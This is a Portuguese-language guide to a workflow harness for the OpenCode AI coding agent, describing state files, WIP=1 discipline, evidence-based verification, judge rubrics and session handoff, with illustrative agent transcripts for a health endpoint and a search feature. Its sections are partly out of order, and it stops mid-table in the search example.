# Harness OpenCode — Guia Completo

> Sistema de workflow que transforma o OpenCode de um agente que "redescobre tudo a cada sessão" em um agente que mantém estado, respeita WIP=1, produz evidência e faz handoff limpo entre sessões.
>
> Baseado no curso **Learn Harness Engineering** e adaptado para OpenCode + PowerShell + Hardware Pulse.

---

## Índice

1. [Arquitetura — As 5 Camadas](#1-arquitetura--as-5-camadas)
2. [Primeira Vez no Projeto](#2-primeira-vez-no-projeto)
3. [Fluxo Completo: Prompt → Conclusão](#3-fluxo-completo-prompt--conclusão)
4. [Os 11 Skills](#4-os-11-skills)
5. [Comandos Globais Slash](#5-comandos-globais-slash)
6. [Artefatos do Harness](#6-artefatos-do-harness)
7. [Ciclo de Vida da Sessão](#7-ciclo-de-vida-da-sessão)
8. [PREVC Integration](#8-prevc-integration)
9. [Exemplos Práticos](#9-exemplos-práticos)
   9.1 [Feature Pequena — Quick Mode](#91-feature-pequena--adiciona-endpoint-get-apihealth)
   9.2 [Feature Grande — Pipeline Completo](#92-feature-grande--sistema-de-busca-com-filtros-e-ordenação)
   9.3 [Tabela Comparativa](#93-tabela-comparativa-pequena-vs-grande)
   9.4 [Dispatch Paralelo — spec-lead Scheduler](#94-dispatch-paralelo--spec-lead-como-scheduler)
   9.5 [Guia de Roteamento — Escolhendo o Fluxo PREVC](#95-guia-de-roteamento--escolhendo-o-fluxo-prevc)
10. [Matriz de Completude](#10-matriz-de-completude)
11. [Harness Global Productizado](#11-harness-global-productizado)
12. [Gate Medido e Risk Router (v1.2)](#12-gate-medido-e-risk-router-v12)
13. [Refine e Regras Aprendidas (v1.3)](#13-refine-e-regras-aprendidas-v13)

---

## 1. Arquitetura — As 5 Camadas

O harness organiza o projeto em 5 camadas. Cada camada resolve uma classe de problemas:

```
┌─────────────────────────────────────────────┐
│  ENTRY        AGENTS.md                     │  1. O agente sabe as regras?
│               (## Harness é a 1ª seção)     │     Sabe o que rodar ao iniciar?
├─────────────────────────────────────────────┤
│  CONTEXT      ARCHITECTURE.md               │  2. O agente entende o sistema?
│               PRODUCT.md                    │     Consegue achar docs relevantes?
│               RELIABILITY.md                │
├─────────────────────────────────────────────┤
│  STATE        feature_list.json             │  3. O agente sabe o que está
│               STATE.md                      │     em progresso? O que quebrou?
│               session-handoff.md            │     Qual a próxima task?
│               sprint-contract.md            │
├─────────────────────────────────────────────┤
│  FEEDBACK     init.ps1                      │  4. O agente consegue verificar
│               quality-thresholds.json       │     se o projeto está saudável?
│               harness-quality-gate.mjs      │     E com QUAL número?
│               zharnessengineering/index.md  │
├─────────────────────────────────────────────┤
│  EVALUATION   harness-judge.md              │  5. O agente consegue avaliar
│               harness-evaluator-rubric      │     o próprio trabalho com
│               harness-risk-router.mjs       │     critérios objetivos —
│               harness-role-separation       │     e com que profundidade?
└─────────────────────────────────────────────┘
```

> **v1.2 (2026-08-10):** as camadas Feedback e Evaluation deixaram de ser binárias. Feedback ganhou
> o **gate medido** (números, não só "o comando passou") e Evaluation ganhou o **risk router**
> (profundidade de review computada, não só um veredito do Judge). Ver §12 e
> `docs/harness/v1.2-context.md`.

### Por que 5 camadas?

| Camada | Problema que resolve | Sem ela |
|---|---|---|
| Entry | Agente não sabe as regras do projeto | Redescobre setup a cada sessão |
| Context | Agente não entende a arquitetura | Toma decisões inconsistentes |
| State | Agente não sabe o progresso | Começa features pela metade, duplica trabalho |
| Feedback | Agente não verifica baseline **com número** | Entrega código quebrado, ou "verde" sem medir nada |
| Evaluation | Agente se auto-avalia | Diz "pronto" sem evidência real — ou inventa uma nota 0–10 |

---

## 2. Primeira Vez no Projeto

> **Atualização global 2026-06-16:** para projetos novos, prefira `/harness-bootstrap`. Ele instala o pacote full do harness de forma interativa: audita, detecta stack, mostra arquivos que serão criados/mesclados e só escreve depois de confirmação explícita.

### Passo a passo para inicializar o harness num projeto novo

```text
1. Invocar harness-initializer
   │
   ├─ Auditoria NÃO-MUTATÓRIA (não cria nada ainda)
   │  ├─ Entry:  AGENTS.md existe? ≤200 linhas?
   │  ├─ State:  feature_list.json? STATE.md? session-handoff.md?
   │  ├─ Feedback: init.ps1 existe? Roda?
   │  ├─ Evaluation: harness-judge.md existe?
   │  └─ Skills:  os 7 skills obrigatórios existem?
   │
   ├─ Fresh-session test (4 perguntas):
   │  ├─ O que esse repo faz?
   │  ├─ Como eu inicio e verifico?
   │  ├─ O que está inacabado?
   │  └─ Qual a próxima task?
   │
   └─ Output: tabela de gaps com recomendações
      │
      ▼
2. Fechar gaps (com aprovação do usuário)
   │
   ├─ Criar init.ps1 (startup script)
   ├─ Criar .specs/project/STATE.md
   ├─ Criar docs/harness/session-handoff.md
   ├─ Criar feature_list.json
   ├─ Criar agent-os/judges/harness-judge.md
   ├─ Criar docs/harness/sprint-contract.md
   └─ Criar skills em .opencode/skills/harness-*/
      │
      ▼
3. Rodar .\init.ps1
   │
   ├─ Backend: uv sync → ruff check → pytest
   ├─ Frontend: npm install → lint → typecheck → test → build
   │
   ├─ Se passar → baseline verde, prosseguir
   └─ Se falhar → registrar em STATE.md Blockers, corrigir antes de features
      │
      ▼
4. Preencher feature_list.json com as features do projeto
   │
   ├─ Cada feature: id, priority, area, title, user_visible_behavior,
   │                 dependencies, status, verification, evidence, notes
   └─ Exatamente UMA feature marcada como in_progress
      │
      ▼
5. Daqui em diante: automático
   │
   ├─ Toda sessão começa com harness-session-start
   └─ Toda sessão termina com harness-clean-handoff
```

### Mínimo Viável

Se o projeto é pequeno, o mínimo viável é:

| Artefato | Propósito |
|---|---|
| `AGENTS.md` enxuto (≤200 linhas) | Regras + entry points |
| `feature_list.json` | WIP=1, estado das tasks |
| `.specs/project/STATE.md` | Progresso durável |
| `init.ps1` | Verificação de baseline |
| `docs/harness/session-handoff.md` | Transferência entre sessões |

Adicione o resto **só quando um failure mode real for observado** — não por antecipação.

---

## 3. Fluxo Completo: Prompt → Conclusão

Este é o caminho que TODO prompt percorre, da entrada do usuário até o handoff:

```
USUÁRIO DIGITA UM PROMPT
    │
    ▼
╔══════════════════════════════════════════════════════════════╗
║  FASE 0 — CONTEXT FEEDFORWARD  (context-feedforward)        ║
║                                                              ║
║  Carrega só o contexto relevante:                            ║
║  1. AGENTS.md → regras e entry points                        ║
║  2. STATE.md → progresso atual, blockers                     ║
║  3. feature_list.json → WIP=1, task ativa                    ║
║  4. zharnessengineering/index.md → roteia pro arquivo certo  ║
║  5. init.ps1 → baseline verde?                               ║
╚══════════════════════════════════════════════════════════════╝
    │
    ▼
╔══════════════════════════════════════════════════════════════╗
║  FASE 1 — PLAN  (harness-wip-control)                       ║
║                                                              ║
║  Decompõe o prompt em unidades WIP=1:                        ║
║  1. Restate: repete o prompt exatamente como recebido        ║
║  2. Decompõe: lista todas as subtasks implícitas             ║
║  3. Ordena por dependência                                   ║
║  4. Marca UMA como in_progress, resto → not_started          ║
║  5. Define AC observáveis (comandos, não descrições)         ║
║  6. Registra non-goals: o que NÃO será feito                 ║
║                                                              ║
║  Se tarefa complexa/subjetiva/UI → preenche sprint-contract  ║
║  Output: "Active: feat-XXX. AC: [comando]. Excluded: [...]"  ║
╚══════════════════════════════════════════════════════════════╝
    │
    ▼
╔══════════════════════════════════════════════════════════════╗
║  FASE 2 — REVIEW  (method map)                              ║
║                                                              ║
║  Checa o method map de failure modes:                        ║
║  ├─ Cold-start confusion? → Não, artefatos carregados        ║
║  ├─ Scope sprawl? → Não, WIP=1 definido                      ║
║  ├─ Premature completion? → Evidência será exigida           ║
║  ├─ Fragile startup? → init.ps1 já rodou                     ║
║  └─ Weak handoff? → Handoff será feito no final              ║
║                                                              ║
║  Gate: Nenhum issue de escopo. Se scope creep → redecompõe.  ║
╚══════════════════════════════════════════════════════════════╝
    │
    ▼
╔══════════════════════════════════════════════════════════════╗
║  FASE 3 — EXECUTE  (WIP=1)                                  ║
║                                                              ║
║  Implementa SOMENTE a feature ativa:                         ║
║  ├─ Trabalho adjacente descoberto → not_started, não mexe    ║
║  ├─ Escopo expande → PARA, atualiza sprint contract          ║
║  └─ UMA feature por vez. Sem exceções.                       ║
║                                                              ║
║  Gate: Só arquivos da feature ativa modificados.             ║
╚══════════════════════════════════════════════════════════════╝
    │
    ▼
╔══════════════════════════════════════════════════════════════╗
║  FASE 4 — VALIDATE  (harness-termination-check)             ║
║                                                              ║
║  3 camadas de verificação ANTES de declarar "pronto":        ║
║                                                              ║
║  LAYER 1 — Static                                           ║
║  ├─ [ ] Typecheck passa                                      ║
║  ├─ [ ] Lint passa                                           ║
║  └─ [ ] Sem novos warnings vs baseline                       ║
║                                                              ║
║  LAYER 2 — Runtime Behavior                                 ║
║  ├─ [ ] AC do sprint contract são observáveis                ║
║  ├─ [ ] Comandos foram rodados, output registrado            ║
║  └─ [ ] Regressão: features passing continuam passando       ║
║                                                              ║
║  LAYER 3 — System Confirmation                              ║
║  ├─ [ ] .\init.ps1 sai 0 (ambos os stacks)                   ║
║  ├─ [ ] feature_list.json + STATE.md respondem "o que mudou" ║
║  └─ [ ] Evidence contém output real, não descrição           ║
║                                                              ║
║  Se qualquer layer falhar → feature → blocked, NÃO diz done  ║
╚══════════════════════════════════════════════════════════════╝
    │
    ▼
╔══════════════════════════════════════════════════════════════╗
║  FASE 5 — JUDGE  (harness-evaluator-rubric)                 ║
║                                                              ║
║  Avaliação externa com 6 dimensões:                          ║
║                                                              ║
║  ┌────────────────────┬──────────────────────────────────┐   ║
║  │ Correctness        │ Comportamento = AC do sprint?    │   ║
║  │ Verification       │ Evidence preenchida com output?  │   ║
║  │ Scope discipline   │ Só arquivos do escopo tocados?   │   ║
║  │ Reliability        │ init.ps1 ainda sai 0?            │   ║
║  │ Maintainability    │ Arquivos ≤200 linhas?            │   ║
║  │ Handoff readiness  │ STATE.md + handoff atualizados?  │   ║
║  └────────────────────┴──────────────────────────────────┘   ║
║                                                              ║
║  Veredictos:                                                 ║
║  ├─ ACCEPT → todas as 6 dimensões passam                     ║
║  ├─ REVISE → 1-2 dimensões falham com caminho claro          ║
║  └─ BLOCK  → scope drift, init.ps1 falha, ou sem evidência   ║
║                                                              ║
║  REGRA: Não produza veredicto no mesmo passo da implementação║
║         Rubric primeiro. Veredicto em passo separado.        ║
╚══════════════════════════════════════════════════════════════╝
    │
    ▼
╔══════════════════════════════════════════════════════════════╗
║  FASE 6 — CONFIRM  (só se Judge = Accept)                   ║
║                                                              ║
║  1. feature_list.json: status → passing, evidence populada   ║
║  2. STATE.md: Current Active Work atualizado                 ║
║  3. Se era a última feature → WIP=0, próximo do roadmap      ║
╚══════════════════════════════════════════════════════════════╝
    │
    ▼
╔══════════════════════════════════════════════════════════════╗
║  FASE 7 — HANDOFF  (harness-clean-handoff)                  ║
║                                                              ║
║  Exit checklist (roda no fim de TODA sessão):                ║
║                                                              ║
║  [ ] feature_list.json → status + evidence atualizados       ║
║  [ ] STATE.md → Active Work, Verification, Next Action       ║
║  [ ] session-handoff.md → 5 seções preenchidas               ║
║  [ ] .\init.ps1 → sai 0 (sem regressão)                      ║
║  [ ] git status → só arquivos intencionais                    ║
║  [ ] Sem arquivos de debug/temp deixados para trás           ║
║                                                              ║
║  Se trabalho INCOMPLETO → ainda faz o handoff:               ║
║  ├─ feature → blocked + razão exata                          ║
║  ├─ session-handoff.md → Broken section preenchida           ║
║  └─ Next Best Step → primeira ação da próxima sessão         ║
╚══════════════════════════════════════════════════════════════╝
    │
    ▼
PRONTO PARA A PRÓXIMA SESSÃO

Uma sessão nova lendo SÓ os arquivos do repo consegue responder:
- O que foi feito?
- O que NÃO foi feito e por quê?
- Qual a única próxima ação?
- Quais comandos provam o estado atual?
```

---

## 4. Os 11 Skills

Cada skill é um arquivo `.opencode/skills/[nome]/SKILL.md`. Invocáveis por nome no OpenCode:

### Skills de Sessão (invocados automaticamente)

| Skill | Quando roda | O que faz |
|---|---|---|
| `harness-session-start` | **Início de toda sessão** | 8-passos: lê STATE.md → feature_list.json → handoff → init.ps1 → git log → seleciona WIP=1 → declara task ativa |
| `harness-clean-handoff` | **Fim de toda sessão** | 5 verificações: atualiza feature_list.json → STATE.md → session-handoff.md → init.ps1 → git status |

### Skills de Planejamento

| Skill | Quando usar | O que faz |
|---|---|---|
| `harness-wip-control` | Antes de qualquer prompt multi-step | Decompõe em WIP=1, define AC observáveis, registra non-goals |
| `harness-initializer` | Primeira vez no projeto | Auditoria não-mutatória das 5 camadas, produz tabela de gaps |

### Skills de Verificação

| Skill | Quando usar | O que faz |
|---|---|---|
| `harness-termination-check` | Antes de declarar "pronto" | 3-layer check: static → runtime → system |
| `harness-readable-workspace` | Harness modificado ou sessão não orienta | 6 perguntas de fresh-session, mapeia gaps → fixes |
| `harness-feature-state` | Antes do Execute phase | Audita feature_list.json: schema, WIP=1, evidence, dependências |
| `harness-context-layer` | Agente toma decisões inconsistentes ou não entende o sistema | Audita ARCHITECTURE.md, PRODUCT.md, RELIABILITY.md — extrai do código |

### Skills de Qualidade

| Skill | Quando usar | O que faz |
|---|---|---|
| `harness-evaluator-rubric` | Antes do Judge phase | Constrói rubrica task-specific do sprint contract |
| `harness-role-separation` | Tarefas complexas/subjetivas/UI | Separa Planner → Generator → Evaluator |
| `harness-continuity` | Trabalho multi-sessão ou feature bloqueada | State machine WIP=1, clean-state checkpoint, blocked protocol |

---

## 5. Comandos Globais Slash

Além dos skills, agora existem comandos globais em `~/.config/opencode/opencode.jsonc` para costurar o workflow automaticamente.

> Mudanças em `opencode.jsonc` só entram depois de fechar e reabrir o OpenCode.

### Comandos disponíveis

| Comando | Quando usar | O que faz |
|---|---|---|
| `/harness-bootstrap` | Primeiro uso em um projeto novo | Instala o pacote full do harness com confirmação: entry, state, context, standards, specs, Judge e handoff |
| `/harness-init` | Primeiro uso em um projeto ou harness ausente | Audita Entry, Context, State, Feedback, Evaluation e Skills sem escrever antes de aprovação |
| `/harness-standards` | Antes de planejar uma feature | Detecta stack e lista standards + skills relevantes |
| `/harness-spec` | Feature média/grande | Cria/propoe spec Agent OS em `agent-os/specs/YYYY-MM-DD-HHMM-slug/` |
| `/harness-session-start` | Logo ao abrir uma sessão | Descobre instruções, progresso, task state e startup path; roda verificação descoberta e declara a task ativa |
| `/prevc <feature ou prompt>` | Para executar uma feature | Executa PREVC global: discover → plan → review → execute → validate → judge → confirm → handoff |
| `/quality [full]` | Antes de devolver uma lane, e antes do commit | Gate medido + risk router: tabela de métricas, tier de review, exit code. Ver §12 |
| `/harness-clean-handoff` | Fim da sessão ou trabalho incompleto | Fecha estado usando artefatos disponíveis e startup path descoberto; depois mostra `git status` |

### Fluxo esperado de uso

```text
Nova sessão em projeto com harness:

0. /harness-init (quando o projeto ainda não tem harness)
   ├─ detecta root, stack, instruções, estado, feedback, avaliação e skills
   ├─ produz gap report não-mutante
   └─ pede aprovação antes de criar qualquer arquivo

   Alternativa recomendada para projeto novo: /harness-bootstrap
   ├─ sempre propõe o pacote full
   ├─ detecta stack e standards
   ├─ mostra create/merge/skip
   └─ só aplica após confirmação explícita

1. /harness-session-start
   ├─ lê AGENTS.md/CLAUDE.md/README.md se existirem
   ├─ descobre progress state: .specs/project/STATE.md, docs/harness/progress.md ou agent-progress.md
   ├─ descobre feature state: feature_list.json ou .specs/features/*/tasks.md
   ├─ lê docs/harness/session-handoff.md se existir
   ├─ descobre startup path: init.ps1, init.sh, make check ou package script
   ├─ roda git log --oneline -3 se for repo git
   └─ declara: Active task: feat-XXX/session-only — título. AC: critérios observáveis.

2. /prevc nome-da-feature-ou-prompt
   ├─ Context Feedforward
   ├─ Initialize
   ├─ Plan com WIP=1
   ├─ Review contra failure modes do Learn Harness Engineering
   ├─ Execute somente a feature ativa
   ├─ Validate com hierarquia: static → unit → integration → E2E → runtime
   ├─ Judge com rubrica e evidência
   ├─ Confirm somente se Judge = Accept
   └─ Handoff com estado durável

3. /harness-clean-handoff
   └─ opcional se /prevc já concluiu, obrigatório se você quer forçar fechamento limpo.
```

### O que `/prevc` descobre como base

O comando global foi configurado para descobrir artefatos em vez de assumir caminhos fixos:

```text
Instruções: AGENTS.md, CLAUDE.md, README.md ou nenhum
Progress state: .specs/project/STATE.md, docs/harness/progress.md, agent-progress.md ou nenhum
Feature state: feature_list.json, .specs/features/*/tasks.md ou session todo
Startup path: init.ps1, init.sh, make check, package scripts ou proposta via harness-startup-path
Evaluation: agent-os/judges/*, rubricas do projeto, CI checks ou proposta via harness-init
Conhecimento extra: docs/ e specs relevantes quando existirem
```

### Regras embutidas no `/prevc`

```text
- Repositório é sistema de registro; nada vive só no chat.
- WIP=1 sempre.
- Completion exige evidência real.
- Não tocar arquivos fora do escopo.
- Trabalho adjacente vira not_started.
- Se o startup path descoberto falhar, registrar blocker e parar.
- Se Judge não for Accept, não confirmar.
- Se bloquear, marcar feature como blocked com causa exata.
```

Esse é o ponto em que o harness deixa de ser só uma coleção de skills e vira um **workflow operacional por comando**.

---

## 11. Harness Global Productizado

O harness global agora é pensado como um pacote reutilizável para qualquer projeto OpenCode, não apenas para este repositório.

### Comando principal

```text
/harness-bootstrap
```

Comportamento:

1. Audita o projeto atual.
2. Detecta stack com `harness-stack-router`.
3. Descobre comando de startup/verificação com `harness-startup-path`.
4. Propõe sempre o pacote **full**.
5. Lista arquivos que serão criados, mesclados ou preservados.
6. Pergunta confirmação explícita.
7. Só escreve após aprovação.

### Pacote full instalado

```text
AGENTS.md
feature_list.json
docs/harness/progress.md
docs/harness/session-handoff.md
docs/harness/sprint-contract.md
docs/ARCHITECTURE.md
docs/PRODUCT.md
docs/RELIABILITY.md
agent-os/judges/project-judge.md
agent-os/standards/
agent-os/specs/_template/
```

### Standards globais

Os templates globais ficam em:

```text
~/.config/opencode/templates/agent-os/standards/
```

Incluem:

- `functional-programming.md`
- `python.md`
- `typescript.md`
- `vue.md`
- `react.md`
- `database.md`
- `security.md`
- `testing.md`
- `architecture.md`
- `ui.md`

O `/prevc` deve detectar stack antes de planejar e carregar standards relevantes. Exemplos:

| Stack detectada | Standards/skills esperados |
|---|---|
| Python + `pyproject.toml` | Python, testing, security, `python-pro`, `uv-package-manager` |
| FastAPI | Python, security, `python-fastapi-development`, `backend-security-coder` |
| SQLAlchemy/Alembic | Database, architecture, `database-engineer` |
| Nuxt/Vue | Vue, TypeScript, UI, security, `vue-engineer` |
| Next/React | React, TypeScript, UI, security, `react`, `nextjs-best-practices` |
| Playwright | Testing, runtime, `playwright-cli` |

### Agent OS specs

Para trabalho significativo, use:

```text
/harness-spec nome-da-feature
```

Ele cria/propoe:

```text
agent-os/specs/YYYY-MM-DD-HHMM-slug/
├── spec.md
├── plan.md
├── tasks.md
├── verification.md
└── decisions.md
```

### PREVC global atualizado

O `/prevc` agora deve seguir este fluxo:

```text
discover repo
→ detect stack
→ load standards
→ create/use Agent OS spec when medium+
→ plan with WIP=1
→ execute approved scope
→ validate with evidence
→ judge against spec/contract
→ confirm only on Accept
→ clean handoff
```

### Portabilidade para outro PC

Exportar no PC atual:

```powershell
& "$env:USERPROFILE\.config\opencode\scripts\export-opencode-harness.ps1"
```

Instalar no outro PC:

```powershell
& ".\install-opencode-harness.ps1" -SourceRoot "." -TargetRoot "$env:USERPROFILE\.config\opencode"
cd "$env:USERPROFILE\.config\opencode"
npm install
```

O export inclui `opencode.jsonc`, `skills`, `plugins`, `templates`, `scripts`, `package.json` e `package-lock.json`. Ele não inclui `node_modules`.

---

## 6. Artefatos do Harness

### O que cada arquivo faz e quando é lido/escrito

| Arquivo | Caminho | Lido em | Escrito em | Propósito |
|---|---|---|---|---|
| **AGENTS.md** | raiz | Session start (automático) | Setup inicial | Regras do projeto, entry points, ## Harness é a 1ª seção |
| **feature_list.json** | raiz | Plan, Execute, Judge | Handoff, após cada feature | Fonte da verdade de WIP=1. 9 campos por feature |
| **STATE.md** | `.specs/project/` | Session start, Context feedforward | Handoff, após cada feature | Progresso durável, blockers, decisões, next action |
| **session-handoff.md** | `docs/harness/` | Session start | Handoff (fim da sessão) | O que foi feito/quebrou/próximo passo |
| **sprint-contract.md** | `docs/harness/` | Execute, Judge | Plan (se tarefa complexa) | Escopo, AC, plano de verificação, log de evidência |
| **init.ps1** | raiz | Session start, Validate | Setup inicial | Verifica backend + frontend passam baseline |
| **harness-judge.md** | `agent-os/judges/` | Judge | Setup inicial | Rubrica de 6 dimensões para tarefas harness-only |
| **index.md** | `zharnessengineering/` | Context feedforward | Setup inicial | Roteia falhas → arquivos de conhecimento |

### Formato do feature_list.json

```json
{
  "features": [
    {
      "id": "feat-001",
      "priority": 1,
      "area": "harness",
      "title": "Nome curto da feature",
      "user_visible_behavior": "O que o agente/usuário vê quando funciona",
      "dependencies": [],
      "status": "not_started",
      "verification": "Comando ou passos que provam que funciona",
      "evidence": "Output real capturado após verificação passar",
      "notes": ""
    }
  ]
}
```

**Regras de status:**
- `not_started` → `in_progress` → `passing` (com evidência)
- `in_progress` → `blocked` (com razão exata no evidence)
- **Apenas UMA feature `in_progress` por vez**
- **Nenhuma feature `in_progress` com dependências não resolvidas**

---

## 7. Ciclo de Vida da Sessão

### Início da Sessão (automático — AGENTS.md força isso)

```text
1. Agente abre o projeto
2. Lê AGENTS.md → vê ## Harness como primeira seção
3. Invoca harness-session-start automaticamente:
   ├─ Lê STATE.md → "Current Active Work: feat-005"
   ├─ Lê feature_list.json → "feat-005 está in_progress"
   ├─ Lê session-handoff.md → "sessão anterior: testes quebraram no backend"
   ├─ Roda .\init.ps1 → backend OK, frontend OK
   ├─ git log --oneline -3 → últimos 3 commits
   └─ Declara: "Active task: feat-005 — Fix backend tests. AC: pytest 100% pass."
4. Começa a trabalhar SOMENTE no feat-005
```

### Durante a Sessão

```text
- Toda task nova descoberta → adiciona em feature_list.json como not_started
- Scope da task ativa expande → PARA, atualiza sprint contract, pede aprovação
- Antes de declarar "pronto" → roda harness-termination-check (3 camadas)
- Se falhar → feature → blocked, registra blocker exato
```

### Fim da Sessão (automático — AGENTS.md força isso)

```text
1. Invoca harness-clean-handoff:
   ├─ feature_list.json: feat-005 → passing, evidence = "pytest: 47 passed, 0 failed"
   ├─ STATE.md: Current Active Work → feat-006, Next Action atualizado
   ├─ session-handoff.md: Verified Now, Changed, Broken, Next Best Step, Commands
   ├─ .\init.ps1: backend OK, frontend OK
   └─ git status: só feature_list.json, STATE.md, session-handoff.md modificados
2. Sessão encerrada. Estado durável preservado.
```

### O que acontece se o trabalho NÃO terminou

```text
1. AINDA invoca harness-clean-handoff:
   ├─ feature_list.json: feat-005 → blocked, evidence = "pytest: 3 failures in test_scraper.py"
   ├─ STATE.md: Blockers → "test_scraper.py: mock de API quebrado após update de dependência"
   ├─ session-handoff.md: Broken section → "3 testes quebram. Erro: AttributeError no mock."
   └─ Next Best Step → "Corrigir mock em test_scraper.py linha 47"
2. Próxima sessão lê os arquivos e sabe EXATAMENTE o que fazer.
```

---

## 8. PREVC Integration

O harness estende o PREVC com fases específicas:

```
PREVC Padrão              Com Harness
─────────────             ──────────────
                          Context Feedforward (fase 0 — carrega estado)
Plan           ─────────→ Plan + WIP=1 (harness-wip-control)
Review         ─────────→ Review + Method Map (checa failure modes)
Execute        ─────────→ Execute + WIP=1 Contract (só feature ativa)
                          Validate + 3-Layer Check (harness-termination-check)
                          Judge + Rubric (harness-evaluator-rubric)
                          Confirm + Evidence (só se Judge = Accept)
                          Handoff (harness-clean-handoff)
```

**A diferença:** sem harness, o agente planeja, executa e avalia o próprio trabalho sem evidência externa. Com harness, cada fase tem um gate objetivo que não depende da memória do agente.

---

## 9. Exemplos Práticos

### 9.1 Feature Pequena — "Adiciona endpoint GET /api/health"

**Prompt do usuário:** `Adiciona um endpoint GET /api/health que retorna { "status": "ok", "db": "connected" }`

**Classificação:** SMALL — 1 arquivo, 1 sentença, escopo óbvio. **Quick mode.** Sem DESIGN, sem TASKS.

#### O que o usuário vê (por fora)

```
Usuário: Adiciona um endpoint GET /api/health que retorna status
         do banco

Agente: [harness-session-start]
        → Lê STATE.md: "Active: nenhuma. Pegando menor not_started."
        → feature_list.json: feat-005 é not_started, priority=5
        → .\init.ps1: backend OK, frontend OK
        → Declara: "Active task: feat-005 — Health endpoint"

        Isso é Small. Vou usar quick mode — sem Design, sem Tasks.
        Só Specify → Execute → Verify.

        SPECIFY:
        - Arquivo: backend/app/api/routes/health.py
        - Novo endpoint GET /api/health
        - Retorna JSON: {"status":"ok","db":"connected"} com check real no banco
        - AC: curl /api/health retorna 200 com JSON acima
        - AC: ruff check passa, pytest passa, init.ps1 sai 0

        EXECUTE:
        [cria health.py com endpoint + check de DB]
        [roda ruff check → OK]
        [roda pytest → 23 passed, 0 failed]
        [roda .\init.ps1 → backend OK, frontend OK]
        [curl /api/health → {"status":"ok","db":"connected"}]

        VERIFY (harness-termination-check):
        Layer 1: ruff OK, typecheck OK
        Layer 2: curl output = AC esperado
        Layer 3: init.ps1 sai 0

        CONFIRM:
        feature_list.json: feat-005 → passing
        evidence: "curl /api/health → 200, ruff OK, pytest 23/0"

        [harness-clean-handoff]
        → STATE.md: Next Action → feat-006
        → session-handoff.md: preenchido
```

#### O que acontece por dentro (arquivos de estado)

```
ANTES:
  feature_list.json:
    feat-005: status "not_started", evidence ""

  STATE.md:
    Current Active Work: none
    Verification Status: backend ?, frontend ?

  docs/harness/session-handoff.md:
    (vazio — template)

DEPOIS:
  feature_list.json:
    feat-005: status "passing",
              evidence: "curl /api/health → 200 OK,
                         ruff check: OK, pytest: 23 passed,
                         init.ps1: ambos stacks OK"

  STATE.md:
    Current Active Work: feat-006 — próximo do roadmap
    Verification Status: backend ✅, frontend ✅
    Decisions Log: "2026-06-10 | Health endpoint com check real de DB"

  docs/harness/session-handoff.md:
    Verified Now: feat-005 — health endpoint
    Changed: backend/app/api/routes/health.py (novo)
    Broken: none
    Next Best Step: feat-006
```

#### Skills usados (ordem)

```
harness-session-start     → orienta no início
harness-wip-control       → confirma que é WIP=1, define AC
harness-termination-check → 3-layer check antes do passing
harness-clean-handoff     → fecha a sessão com estado limpo
```

**Tempo total:** ~2-5 minutos. **Arquivos tocados:** 4 (health.py + 3 state files).

---

### 9.2 Feature Grande — "Sistema de busca com filtros e ordenação"

**Prompt do usuário:** `Adiciona busca full-text nos produtos com filtros por categoria, faixa de preço, e ordenação por preço/nome. Precisa funcionar no frontend (Vue) e backend (FastAPI).`

**Classificação:** COMPLEX — multi-componente, frontend + backend, ambiguidade nos filtros. **Pipeline completo.** SPECIFY → DESIGN → TASKS → EXECUTE.

#### O que o usuário vê (por fora)

```
USUÁRIO: Adiciona busca full-text nos produtos com filtros por
         categoria, faixa de preço, e ordenação — front e back

AGENTE: [harness-session-start]
        → STATE.md: "Active: nenhuma"
        → feature_list.json: feat-020 é not_started
        → init.ps1: backend OK, frontend OK

        [harness-wip-control]
        Isso é Complex — pipeline completo. Decompondo:

        Subtasks identificadas:
          feat-020: Search — Backend endpoint GET /api/v1/parts/search
          feat-021: Search — Índice full-text PostgreSQL (migration)
          feat-022: Search — Frontend SearchBar.vue + search page
          feat-023: Search — Filtros: categoria, preço min/max
          feat-024: Search — Ordenação: preço ASC/DESC, nome A-Z
          feat-025: Search — Testes E2E com Playwright

        WIP=1: feat-020 in_progress. Resto → not_started.
        AC feat-020: GET /api/v1/parts/search?q=gpu&category=placavideo
                      retorna array paginado com total.
        Excluded: frontend (feat-022-024), E2E (feat-025).

        [harness-role-separation]
        Tarefa complexa, multi-sistema. Vou separar papéis:

        ── PLANNER ──
        Preenchendo docs/harness/sprint-contract.md:
          Scope In:
            - feat-020 a feat-025 (6 subtasks)
            - Backend: novo endpoint + migration + query builder
            - Frontend: SearchBar.vue + useSearch composable
          Scope Out:
            - Autocomplete/sugestões (futuro)
            - Indexação ElasticSearch (futuro)
            - Filtro por marca/fabricante (feat-026)
          AC:
            - curl search?q=gpu → 200, array com total
            - Filtro categoria reduz resultados
            - Ordenação por preço ASC funciona
            - Frontend: digitar na busca → resultados em <500ms
          Verification Plan:
            | Check | Command | Pass Condition |
            | backend lint | ruff check | 0 errors |
            | backend test | pytest -k search | all pass |
            | frontend typecheck | npm run typecheck | 0 errors |
            | init | .\init.ps1 | exit 0 |
            | E2E | npm run test:e2e -- search | all pass |

        Planner complete. Switching to Generator role.

        ── GENERATOR ──
        [ITERAÇÃO 1] feat-020 — Backend search endpoint
        → Cria backend/app/api/routes/search.py
        → Adiciona query params: q, category, min_price, max_price,
          sort_by, sort_order, page, page_size
        → Ruff OK, pytest OK, curl OK
        → feat-020 → passing

        [ITERAÇÃO 2] feat-021 — Migration índice full-text
        → Cria migration com GIN index em parts.name + parts.description
        → Alembic upgrade OK
        → feat-021 → passing

        [ITERAÇÃO 3] feat-022 — Frontend SearchBar
        → Cria components/search/SearchBar.vue
        → Cria composables/useSearch.ts
        → Cria pages/search.vue
        → Typecheck OK, lint OK
        → feat-022 → passing

        [ITERAÇÃO 4] feat-023 — Filtros
        → Adiciona CategoryFilter.vue, PriceRangeFilter.vue
        → Wire no useSearch composable
        → feat-023 → passing

        [ITERAÇÃO 5] feat-024 — Ordenação
        → Adiciona SortDropdown.vue
        → Wire no endpoint (sort_by, sort_order)
        → feat-024 → passing

        [ITERAÇÃO 6] feat-025 — Testes E2E
        → Cria tests/e2e/search.spec.ts
        → Playwright: busca "gpu" → vê resultados → filtra → ordena
        → npm run test:e2e → 5 passed
        → feat-025 → passing

        Generator complete. Switching to Evaluator role.

        ── EVALUATOR ──
        [harness-evaluator-rubric]
        Lendo sprint-contract.md...

        | Criterion          | Score | Evidence |
        | Functional         | 5     | Todos 6 AC do sprint contract passam |
        | Verification       | 5     | Evidence populada em todas as 6 features |
        | Scope discipline   | 5     | 12 arquivos tocados, todos no Scope In |
        | Reliability        | 5     | init.ps1 sai 0 |
